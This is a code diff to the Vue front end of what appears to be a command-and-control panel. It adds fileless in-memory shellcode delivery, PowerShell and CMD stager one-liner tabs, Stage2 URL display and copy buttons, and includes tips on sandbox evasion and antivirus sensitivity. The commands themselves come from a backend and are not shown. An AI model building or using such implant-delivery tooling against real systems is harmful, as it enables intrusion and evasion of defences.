@@ -235,10 +235,19 @@
                 <span>交付方式</span>
                 <el-radio-group v-model="stagerDelivery" size="small" @change="fetchStagerCommand">
                   <el-radio-button label="disk">落盘 EXE</el-radio-button>
-                  <el-radio-button label="fileless">内存 Fileless</el-radio-button>
+                  <el-radio-button label="fileless">内存上线</el-radio-button>
                 </el-radio-group>
               </div>
             </div>
+            <el-alert
+              v-if="stagerDelivery === 'fileless'"
+              type="warning"
+              :closable="false"
+              show-icon
+              class="stager-alert"
+              title="内存上线 ≠ BOF"
+              description="此处将 Stage0 Agent 打成 shellcode 在目标内存执行（上线本身）。上线后的 BOF/.NET 是另一步，走 iso_host。杀软对注入极敏感，实验室优先。"
+            />
             <div v-if="stagerMeta.panel_host || stagerMeta.callback" class="stager-meta">
               <div class="stager-meta__row">
                 <span>面板下载 Host</span>
@@ -252,26 +261,85 @@
                 <span>客户端</span>
                 <code>{{ stagerMeta.profile_label || stagerMeta.profile }}</code>
               </div>
+              <div class="stager-meta__row" v-if="stagerMeta.delivery">
+                <span>交付</span>
+                <code>{{ stagerMeta.delivery === 'fileless' ? '内存上线' : '落盘 EXE' }}</code>
+              </div>
+              <div class="stager-meta__row" v-if="stagerMeta.stage2_url">
+                <span>Stage2 URL</span>
+                <code class="stage2-url" :title="stagerMeta.stage2_url">{{ stagerMeta.stage2_url }}</code>
+              </div>
+              <div class="stager-meta__row" v-if="stagerMeta.stage2_bytes">
+                <span>Shellcode</span>
+                <code>{{ formatBytes(stagerMeta.stage2_bytes) }} · TTL {{ stagerMeta.stage2_ttl_sec || 600 }}s</code>
+              </div>
+              <div class="stager-meta__row" v-if="stagerMeta.expires_at">
+                <span>过期</span>
+                <code>{{ stagerMeta.expires_at }}</code>
+              </div>
             </div>
-            <template v-if="stagerCommand">
-              <div class="terminal-card">
-                <div class="terminal-card__dots">
-                  <span></span>
-                  <span></span>
-                  <span></span>
-                </div>
-                <code>{{ stagerCommand }}</code>
+
+            <!-- 落盘：CMD / PS 分栏，后端 recommended 决定默认 -->
+            <template v-if="stagerDelivery === 'disk' && (stagerCommand || stagerCommandPs)">
+              <div class="cmd-tabs">
+                <button
+                  type="button"
+                  class="cmd-tab"
+                  :class="{ 'cmd-tab--active': diskTab === 'ps' }"
+                  @click="diskTab = 'ps'"
+                >PS 直拉 推荐</button>
+                <button
+                  type="button"
+                  class="cmd-tab"
+                  :class="{ 'cmd-tab--active': diskTab === 'cmd' }"
+                  @click="diskTab = 'cmd'"
+                >CMD</button>
+                <button
+                  type="button"
+                  class="cmd-tab"
+                  :class="{ 'cmd-tab--active': diskTab === 'psbat' }"
+                  @click="diskTab = 'psbat'"
+                  v-if="stagerCommandPsBat"
+                >PS+bat</button>
+              </div>
+              <div class="terminal-card terminal-card--sm">
+                <code>{{ activeDiskCommand || '—' }}</code>
               </div>
               <div class="sidebar-actions">
-                <el-button class="sidebar-button" @click="copyStagerCommand">
+                <el-button type="primary" class="sidebar-button" :disabled="!activeDiskCommand" @click="copyText(activeDiskCommand)">
                   <el-icon><CopyDocument /></el-icon>
-                  复制命令
+                  复制当前命令
                 </el-button>
               </div>
+              <ul class="fileless-notes" v-if="stagerNotes.length">
+                <li v-for="(n, i) in stagerNotes" :key="i">{{ n }}</li>
+              </ul>
             </template>
 
-            <div v-else class="empty-copy">
-              选择监听器和平台后，这里会自动生成对应的快速投递命令。若提示模板缺失，请先编译 assets 下 client_template_*。
+            <!-- 内存上线 -->
+            <template v-if="stagerDelivery === 'fileless' && (stagerCommandPs || stagerCommandStager)">
+              <div class="cmd-tabs">
+                <button type="button" class="cmd-tab" :class="{ 'cmd-tab--active': filelessTab === 'ps' }" @click="filelessTab = 'ps'">PS 一行 推荐</button>
+                <button type="button" class="cmd-tab" :class="{ 'cmd-tab--active': filelessTab === 'inline' }" @click="filelessTab = 'inline'" v-if="stagerCommandPsInline">内联</button>
+                <button type="button" class="cmd-tab" :class="{ 'cmd-tab--active': filelessTab === 'stager' }" @click="filelessTab = 'stager'">Stager</button>
+                <button type="button" class="cmd-tab" :class="{ 'cmd-tab--active': filelessTab === 'url' }" @click="filelessTab = 'url'" v-if="stagerMeta.stage2_url">Stage2 URL</button>
+              </div>
+              <div class="terminal-card terminal-card--sm">
+                <code>{{ activeFilelessCommand || '—' }}</code>
+              </div>
+              <div class="sidebar-actions">
+                <el-button type="primary" class="sidebar-button" :disabled="!activeFilelessCommand" @click="copyText(activeFilelessCommand)">
+                  <el-icon><CopyDocument /></el-icon>
+                  复制当前命令
+                </el-button>
+              </div>
+              <ul class="fileless-notes" v-if="stagerNotes.length">
+                <li v-for="(n, i) in stagerNotes" :key="i">{{ n }}</li>
+              </ul>
+            </template>
+
+            <div v-if="!stagerLoading && !stagerCommand && !stagerCommandPs" class="empty-copy">
+              选择监听器和平台后点刷新。落盘需 assets 模板；内存上线需 Donut 可转换该模板。
             </div>
           </div>
         </article>
@@ -304,6 +372,16 @@
                 <el-icon><Monitor /></el-icon>
               </div>
               <p>休眠时间建议保留在 10 到 30 秒区间，兼顾联机体验和自动化沙箱规避。</p>
+            </div>
+
+            <div class="tip-row">
+              <div class="tip-row__icon">
+                <el-icon><Share /></el-icon>
+              </div>
+              <p>
+                <strong>上线</strong>：落盘 EXE 或内存 Fileless（二选一）。
+                <strong>BOF</strong>：上线之后再执行，不是上线步骤。
+              </p>
             </div>
           </div>
         </article>
@@ -461,8 +539,57 @@ const loading = ref(false)
 const activeListeners = ref([])
 const stagerLoading = ref(false)
 const stagerCommand = ref('')
+const stagerCommandPs = ref('')
+const stagerCommandPsInline = ref('')
+const stagerCommandPsBat = ref('')
+const stagerCommandStager = ref('')
+const stagerNotes = ref([])
 const stagerDelivery = ref('disk') // disk | fileless
-const stagerMeta = ref({ panel_host: '', callback: '', profile: '', profile_label: '', delivery: 'disk', stage2_url: '' })
+const diskTab = ref('cmd') // cmd | ps | psbat
+const filelessTab = ref('ps') // ps | stager | url
+const stagerMeta = ref({
+  panel_host: '',
+  callback: '',
+  profile: '',
+  profile_label: '',
+  delivery: 'disk',
+  stage2_url: '',
+  stage2_bytes: 0,
+  stage2_ttl_sec: 0,
+  expires_at: ''
+})
+
+const formatBytes = (n) => {
+  const v = Number(n) || 0
+  if (v < 1024) return `${v} B`
+  if (v < 1024 * 1024) return `${(v / 1024).toFixed(1)} KB`
+  return `${(v / (1024 * 1024)).toFixed(2)} MB`
+}
+
+const activeDiskCommand = computed(() => {
+  if (diskTab.value === 'ps') return stagerCommandPs.value
+  if (diskTab.value === 'psbat') return stagerCommandPsBat.value || stagerCommandPs.value
+  return stagerCommand.value
+})
+
+const activeFilelessCommand = computed(() => {
+  if (filelessTab.value === 'stager') return stagerCommandStager.value
+  if (filelessTab.value === 'inline') return stagerCommandPsInline.value || stagerCommandPs.value
+  if (filelessTab.value === 'url') return stagerMeta.value.stage2_url
+  return stagerCommandPs.value
+})
+
+const emptyStagerMeta = () => ({
+  panel_host: '',
+  callback: '',
+  profile: '',
+  profile_label: '',
+  delivery: stagerDelivery.value || 'disk',
+  stage2_url: '',
+  stage2_bytes: 0,
+  stage2_ttl_sec: 0,
+  expires_at: ''
+})
 
 const currentTaskId = ref('')
 const terminalDialogVisible = ref(false)
@@ -964,7 +1091,11 @@ const doGenerate = async () => {
 const fetchStagerCommand = async () => {
   if (!form.value.listenerId) {
     stagerCommand.value = ''
-    stagerMeta.value = { panel_host: '', callback: '', profile: '', profile_label: '', delivery: 'disk', stage2_url: '' }
+    stagerCommandPs.value = ''
+    stagerCommandPsInline.value = ''
+    stagerCommandStager.value = ''
+    stagerNotes.value = []
+    stagerMeta.value = emptyStagerMeta()
     return
   }
   stagerLoading.value = true
@@ -972,6 +1103,7 @@ const fetchStagerCommand = async () => {
     const parts = form.value.combinedType.split('_')
     const os = parts[0]
     const arch = parts.slice(1).join('_') || 'amd64'
+    const delivery = stagerDelivery.value || 'disk'
     // host = Agent 回连地址；下载域名由后端使用当前面板 Host，勿混用
     const response = await request.get('/api/stager', {
       params: {
@@ -980,35 +1112,61 @@ const fetchStagerCommand = async () => {
         arch,
         host: form.value.lhost,
         profile: form.value.profile || 'reverse',
-        delivery: stagerDelivery.value || 'disk'
+        delivery
       }
     })
-    stagerCommand.value = response.data.command || ''
-    if (response.data.command_ps) {
-      stagerCommand.value = `${response.data.command}\n\n:: PowerShell 备选\n${response.data.command_ps}`
+    const d = response.data || {}
+    stagerCommandPs.value = d.command_ps || ''
+    stagerCommandPsInline.value = d.command_ps_inline || ''
+    stagerCommandPsBat.value = d.command_ps_bat || ''
+    stagerCommandStager.value = d.command_stager || ''
+    stagerNotes.value = Array.isArray(d.notes) ? d.notes : []
+    if (delivery === 'fileless') {
+      stagerCommand.value = d.command_ps || d.command || ''
+      filelessTab.value = 'ps'
+    } else {
+      stagerCommand.value = d.command_cmd || d.command || ''
+      // 后端 recommended 决定默认 tab：command_ps → ps，其他 → cmd
+      diskTab.value = d.recommended === 'command_ps' ? 'ps' : 'cmd'
     }
     stagerMeta.value = {
-      panel_host: response.data.panel_host || '',
-      callback: response.data.callback || form.value.lhost || '',
-      profile: response.data.profile || form.value.profile || '',
-      profile_label: response.data.profile_label || profileLabel.value,
-      delivery: response.data.delivery || stagerDelivery.value || 'disk',
-      stage2_url: response.data.stage2_url || response.data.download || ''
+      panel_host: d.panel_host || '',
+      callback: d.callback || form.value.lhost || '',
+      profile: d.profile || form.value.profile || '',
+      profile_label: d.profile_label || profileLabel.value,
+      delivery: d.delivery || delivery,
+      stage2_url: d.stage2_url || d.download || '',
+      stage2_bytes: d.stage2_bytes || 0,
+      stage2_ttl_sec: d.stage2_ttl_sec || 0,
+      expires_at: d.expires_at || ''
+    }
+    if (delivery === 'fileless' && d.stage2_bytes) {
+      ElMessage.success(`内存 Stage2 已生成（${formatBytes(d.stage2_bytes)}，约 10 分钟有效）`)
     }
   } catch (e) {
     stagerCommand.value = ''
-    stagerMeta.value = { panel_host: '', callback: '', profile: '', profile_label: '', delivery: 'disk', stage2_url: '' }
+    stagerCommandPs.value = ''
+    stagerCommandPsInline.value = ''
+    stagerCommandPsBat.value = ''
+    stagerCommandStager.value = ''
+    stagerNotes.value = []
+    stagerMeta.value = emptyStagerMeta()
     const msg = e?.response?.data?.error || '一键上线命令生成失败'
-    ElMessage.error(msg)
+    const hint = e?.response?.data?.hint
+    ElMessage.error(hint ? `${msg}（${hint}）` : msg)
   } finally {
     stagerLoading.value = false
   }
 }
 
+const copyText = async (text) => {
+  if (!text) return
+  await navigator.clipboard.writeText(text)
+  ElMessage.success('已复制到剪贴板')
+}
+
 const copyStagerCommand = async () => {
-  if (!stagerCommand.value) return
-  await navigator.clipboard.writeText(stagerCommand.value)
-  ElMessage.success('命令已复制到剪贴板')
+  await copyText(stagerCommand.value)
 }
 
 onMounted(async () => {
@@ -1074,6 +1232,72 @@ onUnmounted(() => {
 .stager-meta__row span {
   opacity: 0.7;
   flex-shrink: 0;
+}
+
+.stager-alert {
+  margin-bottom: 10px;
+}
+
+.cmd-tabs {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 6px;
+  margin: 10px 0 8px;
+}
+
+.cmd-tab {
+  border: 1px solid rgba(255, 255, 255, 0.12);
+  background: rgba(255, 255, 255, 0.04);
+  color: inherit;
+  border-radius: 999px;
+  padding: 4px 10px;
+  font-size: 12px;
+  cursor: pointer;
+}
+
+.cmd-tab--active {
+  border-color: var(--el-color-primary);
+  background: color-mix(in srgb, var(--el-color-primary) 22%, transparent);
+  font-weight: 600;
+}
+
+.stage2-url {
+  max-width: 200px;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+  display: inline-block;
+  vertical-align: bottom;
+}
+
+.fileless-block {
+  margin-top: 12px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+.fileless-block__label {
+  font-size: 12px;
+  font-weight: 600;
+  opacity: 0.85;
+}
+
+.terminal-card--sm code {
+  font-size: 11px;
+  word-break: break-all;
+  white-space: pre-wrap;
+  max-height: 120px;
+  overflow: auto;
+  display: block;
+}
+
+.fileless-notes {
+  margin: 12px 0 0;
+  padding-left: 18px;
+  font-size: 11px;
+  line-height: 1.5;
+  opacity: 0.8;
 }
 
 .stager-meta__row code {
